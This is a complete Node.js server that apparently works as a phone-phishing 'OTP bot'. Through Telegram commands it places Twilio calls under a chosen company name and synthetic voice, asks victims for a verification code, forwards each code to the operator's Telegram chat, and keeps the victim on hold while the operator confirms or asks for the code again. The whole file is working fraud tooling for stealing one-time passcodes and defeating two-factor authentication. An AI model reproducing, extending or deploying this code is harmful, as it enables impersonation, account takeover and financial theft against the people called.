const express=require("express")
const bodyParser=require("body-parser")
const fetch=require("node-fetch")
const twilio=require("twilio")

const app=express()
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const PORT=process.env.PORT||3000

const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID

const TWILIO_ACCOUNT_SID=process.env.TWILIO_ACCOUNT_SID
const TWILIO_AUTH_TOKEN=process.env.TWILIO_AUTH_TOKEN
const TWILIO_NUMBER=process.env.TWILIO_NUMBER

const BASE_URL=process.env.BASE_URL

const client=twilio(TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN)

/* SETTINGS */

let settings={
company:"Support",
digits:6,
assistant:0
}

const assistants=[
{name:"Nova",voice:"Polly.Joanna"},
{name:"Lyra",voice:"Polly.Matthew"},
{name:"Orion",voice:"Polly.Amy"},
{name:"Astra",voice:"Polly.Brian"},
{name:"Kairo",voice:"Polly.Justin"},
{name:"Solara",voice:"Polly.Kendra"}
]

/* STATE */

let activeCallSid=null
let activeCaller=null
let activeCode=null
let callStart=null
let lastCaller=null
let callStatus="Idle"

let logs=[]

let panelMessageId=null

/* TELEGRAM */

async function tg(method,data){
return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify(data)
}).then(r=>r.json())
}

async function tgSend(text,buttons=null){

const body={
chat_id:CHAT_ID,
text:text
}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

const res=await tg("sendMessage",body)

return res
}

/* PANEL */

function panelText(){

let status="No active call"

if(callStatus==="Ringing"){
let secs=Math.floor((Date.now()-callStart)/1000)
status=`📞 Ringing
Number: ${activeCaller}
Time: ${secs}s`
}

if(callStatus==="Answered"){
let secs=Math.floor((Date.now()-callStart)/1000)
status=`✅ Answered
Number: ${activeCaller}
Time: ${secs}s
Code: ${activeCode||"waiting"}`
}

if(callStatus==="Ended"){
status=`❌ Call Ended`
}

return `📞 IVR Control Panel

${status}

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistants[settings.assistant].name}`
}

function panelButtons(){
return[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Retry",callback_data:"retry"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{text:"📞 Call Last",callback_data:"calllast"}
],
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
]
]
}

async function updatePanel(){

const text=panelText()
const buttons={inline_keyboard:panelButtons()}

if(!panelMessageId){

const msg=await tgSend(text,panelButtons())

panelMessageId=msg.result.message_id

}else{

try{
await tg("editMessageText",{
chat_id:CHAT_ID,
message_id:panelMessageId,
text:text,
reply_markup:buttons
})
}catch{}
}

}

/* ROOT */

app.get("/",(req,res)=>{
res.send("Server running")
})

/* IVR START */

app.post("/ivr",(req,res)=>{

callStatus="Ringing"
activeCaller=req.body.From
callStart=Date.now()

updatePanel()

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
</Response>
`)
})

/* CODE RECEIVED */

app.post("/code",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From
const sid=req.body.CallSid

activeCallSid=sid
activeCaller=caller
activeCode=digits
callStatus="Answered"
callStart=Date.now()

lastCaller=caller

logs.unshift(`${caller} : ${digits}`)
logs=logs.slice(0,10)

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Please wait while we verify your code.
</Say>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)

setTimeout(async()=>{

await tgSend(`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`)

updatePanel()

},0)

})

/* HOLD LOOP */

app.post("/hold",(req,res)=>{

res.type("text/xml")

res.send(`
<Response>
<Pause length="10"/>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)
})

/* TELEGRAM */

app.post("/telegram",async(req,res)=>{

const update=req.body

if(update.callback_query){

const action=update.callback_query.data

if(action==="confirm"){

await client.calls(activeCallSid).update({
twiml:`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Thank you. Your code has been confirmed. Have a great day.
</Say>
<Hangup/>
</Response>
`
})

callStatus="Ended"
activeCallSid=null
activeCode=null

updatePanel()

}

if(action==="retry"){

await client.calls(activeCallSid).update({
twiml:`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Please re-enter your code.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
</Response>
`
})

activeCode=null
updatePanel()

}

if(action==="hangup"){

await client.calls(activeCallSid).update({
twiml:`<Response><Hangup/></Response>`
})

callStatus="Ended"

activeCallSid=null
activeCode=null

updatePanel()

}

if(action==="calllast"){
startCall(lastCaller)
}

if(action==="status"){
updatePanel()
}

if(action==="logs"){

let text="📜 Logs\n\n"

logs.forEach(l=>{
text+=l+"\n"
})

tgSend(text)
}

}

/* COMMANDS */

if(update.message){

const text=update.message.text

if(text.startsWith("/digits")){

const d=parseInt(text.split(" ")[1])

if(d>=2 && d<=10){
settings.digits=d
tgSend(`✅ ${d} digits set`)
updatePanel()
}

}

if(text.startsWith("/assistant")){

const a=parseInt(text.split(" ")[1])

if(a>=1 && a<=assistants.length){
settings.assistant=a-1
tgSend(`🤖 ${assistants[a-1].name} assistant set`)
updatePanel()
}

}

if(text.startsWith("/call")){

const number=text.split(" ")[1]

if(!number){
tgSend("Usage: /call +447xxxxxxxx")
return
}

startCall(number)

tgSend(`📞 Calling ${number}`)

}

if(text.startsWith("/company")){

settings.company=text.replace("/company ","")

tgSend(`🏢 Company set to ${settings.company}`)

updatePanel()

}

if(text==="/panel"){
panelMessageId=null
updatePanel()
}

if(text==="/commands"){

tgSend(`⚙ Commands

/digits X → set digits
/assistant X → set assistant
/company NAME → set company
/panel → open control panel
/status → refresh panel
/logs → show last codes

Current:
${settings.digits} digits set
Assistant: ${assistants[settings.assistant].name}
Company: ${settings.company}`)

}

}

res.sendStatus(200)

})

/* START CALL */

async function startCall(number){

if(!number)return

await client.calls.create({
url:`${BASE_URL}/ivr`,
to:number,
from:TWILIO_NUMBER
})

}

/* LIVE PANEL UPDATE */

setInterval(()=>{

if(panelMessageId){
updatePanel()
}

},1000)

app.listen(PORT,()=>{
console.log("Server started")
})
